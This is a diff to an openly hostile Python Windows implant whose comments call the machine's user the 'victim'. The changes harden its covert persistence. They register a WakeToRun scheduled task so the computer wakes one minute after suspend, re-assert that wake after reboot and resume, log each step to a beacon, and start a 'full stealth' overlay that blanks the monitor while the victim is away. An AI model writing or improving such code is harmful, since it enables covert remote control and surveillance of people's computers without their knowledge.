@@ -2167,11 +2167,12 @@ def _register_wake_task(install_path: str, minutes: int = 0,
                             ctypes.POINTER(ctypes.c_void_p))
             out = ctypes.c_void_p()
             v = VARIANT()
-            reg(folder, ctypes.c_wchar_p(SCHTASK_NAME), xml, 6,
-                ctypes.byref(v), ctypes.byref(v), 3, ctypes.byref(v),
-                ctypes.byref(out))     # TASK_CREATE_OR_UPDATE / INTERACTIVE_TOKEN
+            hr = reg(folder, ctypes.c_wchar_p(SCHTASK_NAME), xml, 6,
+                     ctypes.byref(v), ctypes.byref(v), 3, ctypes.byref(v),
+                     ctypes.byref(out))  # TASK_CREATE_OR_UPDATE / INTERACTIVE_TOKEN
             _com_release(out)
-            return True
+            return hr == 0   # S_OK only - a failed RegisterTaskDefinition
+                             # (access denied etc.) must not report success
         finally:
             _ts_release(svc, folder)
     except Exception:
@@ -2184,6 +2185,21 @@ def _wake_arm() -> str:
     if _register_wake_task(_persistence_exe(), 0, highest=True):
         return "[+] wake armed (task registered with WakeToRun)"
     return "[+] wake armed (flag set; task re-register failed)"
+
+
+def _wake_rearm() -> bool:
+    """Re-assert <WakeToRun> on the persistence task after a boot/resume
+    cycle while the wake flag is still armed. The plain on-logon task XML
+    (install_persistence / _persistence_guard) has no WakeToRun, and any
+    rewrite of that task while the flag file persists would silently break
+    the next suspend-time wake. Returns True when nothing was needed or the
+    re-registration succeeded."""
+    if not _wake_armed():
+        return True
+    try:
+        return bool(_register_wake_task(_persistence_exe(), 0, highest=True))
+    except Exception:
+        return False
 
 
 def _loader_exe_path() -> str:
@@ -2354,20 +2370,44 @@ def _power_hook() -> None:
                     ("lpszMenuName", ctypes.c_wchar_p),
                     ("lpszClassName", ctypes.c_wchar_p)]
 
+    last_resume = [0.0]   # some power plans deliver >1 PBT_APMRESUME* per wake
+
     def proc(hwnd, msg, wp, lp):
         if msg == WM_POWERBROADCAST:
             try:
-                if wp == PBT_APMSUSPEND and _wake_armed():
-                    _register_wake_task(_persistence_exe(), 1,
-                                        highest=True)   # wake +1min
-                elif (wp in (PBT_APMRESUMESUSPEND, PBT_APMRESUMEAUTOMATIC)
-                      and _wake_armed()):
-                    time.sleep(2.0)
-                    if _idle_seconds() > 30:   # victim still away
-                        # full stealth: overlay + monitor off + keep-awake,
-                        # auto-exits when the victim touches mouse/keyboard
-                        threading.Thread(target=_stealth_on, args=("resume",),
-                                         daemon=True).start()
+                if wp == PBT_APMSUSPEND:
+                    if _wake_armed():
+                        # wake +1min: re-register with a one-shot timer so the
+                        # machine comes back even if the victim never returns
+                        ok = _register_wake_task(_persistence_exe(), 1,
+                                                 highest=True)
+                        _beacon_log("[power] suspend (wake armed): wake+1min "
+                                    "task %s" % ("ok" if ok else "FAILED"))
+                    else:
+                        _beacon_log("[power] suspend (wake not armed)")
+                elif wp in (PBT_APMRESUMESUSPEND, PBT_APMRESUMEAUTOMATIC):
+                    now = time.time()
+                    if now - last_resume[0] < 5.0:
+                        return 1
+                    last_resume[0] = now
+                    time.sleep(2.0)      # let Task Scheduler settle after wake
+                    if _wake_armed():
+                        rearm = _wake_rearm()
+                        if _idle_seconds() > 30:   # victim still away
+                            # full stealth: overlay + monitor off + keep-awake,
+                            # auto-exits on the victim's physical input
+                            _beacon_log("[power] resume (wake armed, idle "
+                                        ">30s): rearm=%s -> stealth"
+                                        % ("ok" if rearm else "FAILED"))
+                            threading.Thread(target=_stealth_on,
+                                             args=("resume",),
+                                             daemon=True).start()
+                        else:
+                            _beacon_log("[power] resume (wake armed, user "
+                                        "present): rearm=%s, staying visible"
+                                        % ("ok" if rearm else "FAILED"))
+                    else:
+                        _beacon_log("[power] resume (wake not armed)")
             except Exception:
                 pass
             return 1
@@ -3834,4 +3874,9 @@ if __name__ == "__main__":
         threading.Thread(target=_persistence_guard, daemon=True,
                          name=f"guard-{BUILD_ID[:8]}").start()
     _start_power_hook()   # WM_POWERBROADCAST watcher (suspend/resume)
+    # Boot cycle: if a wake was armed earlier (flag survives reboot while the
+    # task XML may have been rewritten without WakeToRun), re-assert it.
+    if _wake_armed():
+        _beacon_log("[power] boot: wake armed; rearm=%s"
+                    % ("ok" if _wake_rearm() else "FAILED"))
     connect()
